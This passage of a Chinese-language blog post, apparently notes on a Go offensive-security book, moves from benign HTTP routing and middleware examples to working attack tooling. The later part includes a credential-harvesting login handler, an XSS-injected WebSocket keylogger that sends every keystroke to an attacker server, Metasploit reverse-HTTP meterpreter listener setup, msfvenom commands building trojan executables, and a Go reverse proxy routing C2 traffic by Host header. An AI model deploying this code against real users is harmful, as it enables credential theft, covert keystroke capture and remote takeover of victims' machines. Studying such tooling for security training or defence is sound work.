class="literal">nil</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="简单路由器"><a href="#简单路由器" class="headerlink" title="简单路由器"></a>简单路由器</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> router <span class="keyword">struct</span> &#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(r *router)</span></span> ServeHTTP(w http.ResponseWriter, req *http.Request) &#123;</span><br><span class="line">   <span class="keyword">switch</span> req.URL.Path &#123;</span><br><span class="line">   <span class="keyword">case</span> <span class="string">&quot;/a&quot;</span>:</span><br><span class="line">      fmt.Fprint(w, <span class="string">&quot;Executing /a&quot;</span>)</span><br><span class="line">   <span class="keyword">default</span>:</span><br><span class="line">      http.Error(w, <span class="string">&quot;404 Not Found&quot;</span>, <span class="number">404</span>)</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">   <span class="keyword">var</span> r router</span><br><span class="line">   http.ListenAndServe(<span class="string">&quot;:8000&quot;</span>, &amp;r)</span><br></pre></td></tr></table></figure><h4 id="简单的中间件"><a href="#简单的中间件" class="headerlink" title="简单的中间件"></a>简单的中间件</h4><ul><li>相比上一个简单路由器案例，这里有点像包装了一层的感觉</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> logger <span class="keyword">struct</span> &#123;</span><br><span class="line">   Inner http.Handler <span class="comment">//接口http.Handler</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(l *logger)</span></span> ServeHTTP(w http.ResponseWriter, req *http.Request) &#123;</span><br><span class="line">   log.Printf(<span class="string">&quot;start %s\n&quot;</span>, time.Now().String())</span><br><span class="line">   l.Inner.ServeHTTP(w, req)</span><br><span class="line">   log.Printf(<span class="string">&quot;finish %s\n&quot;</span>, time.Now().String())</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">hello</span><span class="params">(w http.ResponseWriter, req *http.Request)</span></span> &#123;</span><br><span class="line">   fmt.Fprint(w, <span class="string">&quot;Hello\n&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">   f := http.HandlerFunc(hello)     <span class="comment">//使用http.HandlerFunc()中创建接口http.Handler</span></span><br><span class="line">   l := logger&#123;Inner: f&#125;            <span class="comment">//创建记录器，将字段Inner设置为新创建的处理程序。相比上一个简单路由器案例，这里有点像包装了一层的感觉</span></span><br><span class="line">   http.ListenAndServe(<span class="string">&quot;:8000&quot;</span>, &amp;l) <span class="comment">//指向记录器实例的指针来启动都武器</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="使用gorilla-x2F-mux包进行路由"><a href="#使用gorilla-x2F-mux包进行路由" class="headerlink" title="使用gorilla&#x2F;mux包进行路由"></a>使用gorilla&#x2F;mux包进行路由</h4><p>本书P103</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">   r := mux.NewRouter()</span><br><span class="line">   r.HandleFunc(<span class="string">&quot;/azh3n&quot;</span>,</span><br><span class="line">      <span class="function"><span class="keyword">func</span><span class="params">(w http.ResponseWriter, req *http.Request)</span></span> &#123;</span><br><span class="line">         fmt.Fprint(w, <span class="string">&quot;goodbye W !&quot;</span>)</span><br><span class="line">      &#125;).Methods(<span class="string">&quot;GET&quot;</span>)</span><br><span class="line">   http.ListenAndServe(<span class="string">&quot;:8000&quot;</span>, r) <span class="comment">//注意这里后面不加&amp;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Azh3n/blog-img/image-20230126234806082.png" alt="image-20230126234806082"></p><h4 id="使用negroni包构建中间件"><a href="#使用negroni包构建中间件" class="headerlink" title="使用negroni包构建中间件"></a>使用negroni包构建中间件</h4><ul><li>拥有默认的中间件很好，但只有创建自己的中间件才能让negroni包发挥真正的作用</li><li>这里的<strong>ServeHTTP</strong>方法与之前不同，多了一个http.HandlerFunc参数，用于传递给下一个中间件的函数。</li></ul><p><img src="https://cdn.jsdelivr.net/gh/Azh3n/blog-img/image-20230127154605043.png" alt="image-20230127154605043"></p><p><img src="https://cdn.jsdelivr.net/gh/Azh3n/blog-img/image-20230127155021125.png" alt="image-20230127155021125"></p><ul><li>使用此方法编写中间件很方便，因为我们可以轻松地将执行传递给下一个中间件。但该方法也有一个缺点：无论编写什么都必须使用negroni包。例如，我们正在编写一个将安全标头写入响应的中间件包，希望它可以实现接口htp.Handler,这样就可以在其他应用程序栈中使用该接口，因为大多数程序栈都不太“欢迎”接口negroni.Handler。究其原因，无论中间件是什么用途，尝试在非negroni程序栈中使用negroni中间件时都可能会出现兼容性问题，反之亦然。</li></ul><p><img src="https://cdn.jsdelivr.net/gh/Azh3n/blog-img/image-20230127155358560.png" alt="image-20230127155358560"></p><h4 id="使用negroni包添加身份验证"><a href="#使用negroni包添加身份验证" class="headerlink" title="使用negroni包添加身份验证"></a>使用negroni包添加身份验证</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> badAuth <span class="keyword">struct</span> &#123;</span><br><span class="line">   Username <span class="type">string</span></span><br><span class="line">   Password <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(b *badAuth)</span></span> ServeHTTP(w http.ResponseWriter, r *http.Request, next http.HandlerFunc) &#123;</span><br><span class="line">   username := r.URL.Query().Get(<span class="string">&quot;username&quot;</span>)</span><br><span class="line">   password := r.URL.Query().Get(<span class="string">&quot;password&quot;</span>)</span><br><span class="line">   <span class="keyword">if</span> username != b.Username || password != b.Password &#123;</span><br><span class="line">      http.Error(w, <span class="string">&quot;Unauthorized&quot;</span>, <span class="number">401</span>)</span><br><span class="line">      <span class="keyword">return</span></span><br><span class="line">   &#125;</span><br><span class="line">   ctx := context.WithValue(r.Context(), <span class="string">&quot;username&quot;</span>, username) <span class="comment">//从请求中初始上下文。并在上下文中设置一个名为username的变量</span></span><br><span class="line">   r = r.WithContext(ctx)                                      <span class="comment">//请求使用新的上下文</span></span><br><span class="line">   next(w, r)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">hello</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">   username := r.Context().Value(<span class="string">&quot;username&quot;</span>).(<span class="type">string</span>) <span class="comment">//从请求上下文获取用户名</span></span><br><span class="line">   fmt.Fprintf(w, <span class="string">&quot;Hi %s\n&quot;</span>, username)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">   r := mux.NewRouter()                         <span class="comment">//创建路由器</span></span><br><span class="line">   r.HandleFunc(<span class="string">&quot;/hello&quot;</span>, hello).Methods(<span class="string">&quot;GET&quot;</span>) <span class="comment">//设置接口</span></span><br><span class="line">   n := negroni.Classic()                       <span class="comment">//使用默认的中间件(创建一个指向negroni实例的新指针)</span></span><br><span class="line">   n.Use(&amp;badAuth&#123;</span><br><span class="line">      Username: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">      Password: <span class="string">&quot;password&quot;</span>,</span><br><span class="line">   &#125;)</span><br><span class="line">   n.UseHandler(r) <span class="comment">//将路由器添加到中间件堆栈</span></span><br><span class="line">   http.ListenAndServe(<span class="string">&quot;:8000&quot;</span>, n)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Azh3n/blog-img/image-20230127211739949.png" alt="image-20230127211739949"></p><h4 id="使用模板生成HTML响应"><a href="#使用模板生成HTML响应" class="headerlink" title="使用模板生成HTML响应"></a>使用模板生成HTML响应</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> x = <span class="string">`</span></span><br><span class="line"><span class="string">&lt;html&gt;</span></span><br><span class="line"><span class="string">  &lt;body&gt;</span></span><br><span class="line"><span class="string">    Hello &#123;&#123;.&#125;&#125;</span></span><br><span class="line"><span class="string">  &lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">`</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">   t, err := template.New(<span class="string">&quot;hello&quot;</span>).Parse(x) <span class="comment">//创建一个新模板，调用Parse(x)对x内容进行解析，并返回一个指针</span></span><br><span class="line">   <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">      <span class="built_in">panic</span>(err)</span><br><span class="line">   &#125;</span><br><span class="line">   t.Execute(os.Stdout, <span class="string">&quot;&lt;script&gt;alert(&#x27;world&#x27;)&lt;/script&gt;&quot;</span>) <span class="comment">//第二个变量用于渲染模板的上下文</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Azh3n/blog-img/image-20230127181816704.png" alt="image-20230127181816704"></p><h3 id="凭证收割"><a href="#凭证收割" class="headerlink" title="凭证收割"></a>凭证收割</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">login</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">   log.WithFields(log.Fields&#123; <span class="comment">//日志记录并写出捕获的数据</span></span><br><span class="line">      <span class="string">&quot;time&quot;</span>:       time.Now().String(),</span><br><span class="line">      <span class="string">&quot;username&quot;</span>:   r.FormValue(<span class="string">&quot;_user&quot;</span>), <span class="comment">//捕获提交的用户名和密码</span></span><br><span class="line">      <span class="string">&quot;password&quot;</span>:   r.FormValue(<span class="string">&quot;_pass&quot;</span>),</span><br><span class="line">      <span class="string">&quot;user-agent&quot;</span>: r.UserAgent(),</span><br><span class="line">      <span class="string">&quot;ip_address&quot;</span>: r.RemoteAddr,</span><br><span class="line">   &#125;).Info(<span class="string">&quot;login attempt&quot;</span>)</span><br><span class="line">   http.Redirect(w, r, <span class="string">&quot;/&quot;</span>, <span class="number">302</span>) <span class="comment">//重定位</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">   fh, err := os.OpenFile(<span class="string">&quot;credentials.txt&quot;</span>,</span><br><span class="line">      os.O_CREATE|os.O_APPEND|os.O_WRONLY, <span class="number">0600</span>) <span class="comment">//打开一个文件，用于存储</span></span><br><span class="line">   <span class="keyword">defer</span> fh.Close()</span><br><span class="line">   <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">      <span class="built_in">panic</span>(err)</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   log.SetOutput(fh) <span class="comment">//将日志内容写入fh文件句柄</span></span><br><span class="line"></span><br><span class="line">   r := mux.NewRouter()                                           <span class="comment">//创建新路由器</span></span><br><span class="line">   r.HandleFunc(<span class="string">&quot;/login&quot;</span>, login).Methods(<span class="string">&quot;POST&quot;</span>)                  <span class="comment">//使用处理函数login()</span></span><br><span class="line">   r.PathPrefix(<span class="string">&quot;/&quot;</span>).Handler(http.FileServer(http.Dir(<span class="string">&quot;public&quot;</span>))) <span class="comment">//启动服务器前，告诉路由器从一个目录中提供静态文件(HTML,JS,图片)</span></span><br><span class="line">   log.Fatal(http.ListenAndServe(<span class="string">&quot;:8080&quot;</span>, r))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Azh3n/blog-img/image-20230127214224180.png" alt="image-20230127214224180"></p><h3 id="利用XSS获取用户输入内容-使用WebSocket-API-实现按键记录"><a href="#利用XSS获取用户输入内容-使用WebSocket-API-实现按键记录" class="headerlink" title="利用XSS获取用户输入内容(使用WebSocket API 实现按键记录)"></a>利用XSS获取用户输入内容(使用WebSocket API 实现按键记录)</h3><ul><li><p>WebSocket 对于构建诸如聊天和游戏之类的实时应用程序很有用</p></li><li><p>但也可以用于邪恶的目的，例如键盘记录器</p><h5 id="index-html"><a href="#index-html" class="headerlink" title="index.html"></a>index.html</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCRTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">title</span>&gt;</span>Login<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&#x27;http://127.0.0.1:8080/k.js&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&#x27;/login&#x27;</span> <span class="attr">method</span>=<span class="string">&#x27;post&#x27;</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&#x27;usrename&#x27;</span>/&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&#x27;password&#x27;</span>/&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&#x27;submit&#x27;</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h5 id="logger-js"><a href="#logger-js" class="headerlink" title="logger.js"></a>logger.js</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> conn = <span class="keyword">new</span> <span class="title class_">WebSocket</span>(<span class="string">&quot;ws://&#123;&#123;.&#125;&#125;/ws&quot;</span>);</span><br><span class="line">    <span class="variable language_">document</span>.<span class="property">onkeypress</span> = keypress;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">keypress</span>(<span class="params">evt</span>) &#123;</span><br><span class="line">        s = <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(evt.<span class="property">which</span>);</span><br><span class="line">        conn.<span class="title function_">send</span>(s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><h5 id="main-go"><a href="#main-go" class="headerlink" title="main.go"></a>main.go</h5></li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> (</span><br><span class="line">   upgrader = websocket.Upgrader&#123;</span><br><span class="line">      CheckOrigin: <span class="function"><span class="keyword">func</span><span class="params">(r *http.Request)</span></span> <span class="type">bool</span> &#123;</span><br><span class="line">         <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">      &#125;,</span><br><span class="line">   &#125;</span><br><span class="line">   listenAddr <span class="type">string</span></span><br><span class="line">   wsAddr     <span class="type">string</span></span><br><span class="line">   jsTemplate *template.Template</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">init</span><span class="params">()</span></span> &#123; <span class="comment">//init内置函数</span></span><br><span class="line">   flag.StringVar(&amp;listenAddr, <span class="string">&quot;listen-addr&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;Address to listen on&quot;</span>)</span><br><span class="line">   flag.StringVar(&amp;wsAddr, <span class="string">&quot;ws-addr&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;Address for WebSocket connection&quot;</span>)</span><br><span class="line">   flag.Parse()</span><br><span class="line">   jsTemplate, _ = template.ParseFiles(<span class="string">&quot;logger.js&quot;</span>) <span class="comment">//用来解析存储在logger.js文件中的go模版</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">serveWS</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">   conn, err := upgrader.Upgrade(w, r, <span class="literal">nil</span>) <span class="comment">//方法Upgrade实现了升级HTTP连接使用WebSocket协议, 会有一个连接conn</span></span><br><span class="line">   <span class="keyword">defer</span> conn.Close()</span><br><span class="line">   <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">      http.Error(w, <span class="string">&quot;&quot;</span>, <span class="number">500</span>)</span><br><span class="line">      <span class="keyword">return</span></span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   fmt.Printf(<span class="string">&quot;Connection from %s\n&quot;</span>, conn.RemoteAddr().String()) <span class="comment">//打印出连接端的地址</span></span><br><span class="line">   <span class="keyword">for</span> &#123;</span><br><span class="line">      _, msg, err := conn.ReadMessage() <span class="comment">//读取内容，到缓冲区</span></span><br><span class="line">      <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">         <span class="keyword">return</span></span><br><span class="line">      &#125;</span><br><span class="line">      fmt.Printf(<span class="string">&quot;From %s: %s\n&quot;</span>, conn.RemoteAddr().String(), <span class="type">string</span>(msg))</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">serveFile</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">   w.Header().Set(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;application/javascript&quot;</span>) <span class="comment">//设置头为js解析</span></span><br><span class="line">   jsTemplate.Execute(w, wsAddr)                            <span class="comment">//把wsAddr(输入的地址)传入w</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">   r := mux.NewRouter() <span class="comment">//创建路由</span></span><br><span class="line">   r.HandleFunc(<span class="string">&quot;/ws&quot;</span>, serveWS)</span><br><span class="line">   r.HandleFunc(<span class="string">&quot;/k.js&quot;</span>, serveFile)</span><br><span class="line">   log.Fatal(http.ListenAndServe(<span class="string">&quot;:8080&quot;</span>, r))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>简单描述一下上面代码的执行过程描述一下：<ol><li>首先启动恶意服务器端程序，内置函数Init()会优先执行。进行命令行输入，初始化服务器端js模板jsTemplate。</li><li>构造恶意js代码通过xss传入。（其实就是用了个src外部解析）</li><li>恶意服务器端，对被害者网页通过路由解析<a href="http://ip:port/k.js时，触发服务器端的">http://ip:port/k.js时，触发服务器端的</a> r.HandleFunc(“&#x2F;k.js”, serveFile)。然后wsAddr会被写入w并执行模板</li><li>与此同时，由于上面执行了模板，所以服务器的logger.js被触发，安装了键盘记录器，并通过serveWS进行webSocket通信，将数据传送回攻击者服务器</li></ol></li></ul><h3 id="GO代理Meterpreter-多路命令与控制"><a href="#GO代理Meterpreter-多路命令与控制" class="headerlink" title="GO代理Meterpreter( 多路命令与控制)"></a>GO代理Meterpreter( 多路命令与控制)</h3><p>起两个MSF服务器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter_reverse_http</span><br><span class="line">set LHOST 192.168.1.17</span><br><span class="line">set LPORT 80</span><br><span class="line">set ReverseListenerBindAddress 192.168.1.17</span><br><span class="line">set ReverseListenerBindPort 10080</span><br><span class="line">exploit -j -z</span><br><span class="line"></span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter_reverse_http</span><br><span class="line">set LHOST 192.168.1.17</span><br><span class="line">set LPORT 80</span><br><span class="line">set ReverseListenerBindAddress 192.168.1.17</span><br><span class="line">set ReverseListenerBindPort 20080</span><br><span class="line">exploit -j -z</span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> (</span><br><span class="line">   hostProxy = <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">string</span>]<span class="type">string</span>)                 <span class="comment">//[主机名][MSF_URL]将主机名映射到MSF监听器的URL</span></span><br><span class="line">   proxies   = <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">string</span>]*httputil.ReverseProxy) <span class="comment">//[主机名][*httputil.ReverseProxy实例]</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">/***********初始化hostProxy和proxies************/</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">init</span><span class="params">()</span></span> &#123;</span><br><span class="line">   hostProxy[<span class="string">&quot;attacker1.com&quot;</span>] = <span class="string">&quot;http://10.0.1.20:10080&quot;</span></span><br><span class="line">   hostProxy[<span class="string">&quot;attacker2.com&quot;</span>] = <span class="string">&quot;http://10.0.1.20:20080&quot;</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">for</span> k, v := <span class="keyword">range</span> hostProxy &#123; <span class="comment">//遍历hostProxy映射</span></span><br><span class="line">      remote, err := url.Parse(v) <span class="comment">//解析目标地址以创建Net.URL实例</span></span><br><span class="line">      <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">         log.Fatal(<span class="string">&quot;Unable to parse proxy target&quot;</span>)</span><br><span class="line">      &#125;</span><br><span class="line">      proxies[k] = httputil.NewSingleHostReverseProxy(remote) <span class="comment">//设置URL反向代理</span></span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">   r := mux.NewRouter() <span class="comment">//创建路由</span></span><br><span class="line">   <span class="keyword">for</span> host, proxy := <span class="keyword">range</span> proxies &#123;</span><br><span class="line">      r.Host(host).Handler(proxy) <span class="comment">//在每个主机名都添加了一个proxy</span></span><br><span class="line">   &#125;</span><br><span class="line">   log.Fatal(http.ListenAndServe(<span class="string">&quot;:80&quot;</span>, r))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先，我们使用了net&#x2F;http&#x2F;httputil包，这个包可以帮助我们快速构建一个反向代理。然后我们来构建一对变量。这两个变量都是映射，我们使用第一个hostProxy将主机名映射到我们希望该主机名路由到的msf监听器url。然后第二个变量proxies也将使用主机名作为键值。但是，它们在映射中的对应值为实例*httputil.ReverseProxy，也就是说，这些值将是可以路由到实际的代理实例，而不是目标的字符串表示形式。</p><p>然后我们使用init()函数来进行域名和目标msf服务器之间的映射。我们将attacker1.com的路由请求到192.168.1.2服务器的10080端口，将attacker2.com的路由请求到192.168.1.2的20080端口。然后循环解析目标地址来创建net.URL，并且将其结果用作从URL创建反向代理函数的参数。而且该函数返回值httputil.ReverseProxy属于接口类型http.Handler，也就是说，我们可以利用它直接用阿里当作路由器的处理程序。</p><p>最后，我们在main函数中循环，将我们创建好的代理处理程序添加到路由中。而Gorilla MUX工具箱的Route类型包含一个名为Host的匹配函数，通过该函数，我们可以将传入的不同的host值的http请求调用不同的处理程序进行处理。</p><p>然后我们使用msf分别创建两个木马。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter_reverse_http LHOST=192.168.1.17 LPORT=80 HttpHostHeader=attacker1.com -f exe -o payload1.exe</span><br><span class="line">msfvenom -p windows/meterpreter_reverse_http LHOST=192.168.1.17 LPORT=80 HttpHostHeader=attacker2.com -f exe -o payload2.exe</span><br></pre></td></tr></table></figure><p>由于我们实际在内网环境进行测试，并没有真实的使用域名，而我们编写的代理服务器，是将host头中的域名进行检测，来判断向那个msf服务器进行会话的发送，所以我们要在windows的host文件中将我们的attacker1.com、attacker2.com以及其对应的cs端口添加进去。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span 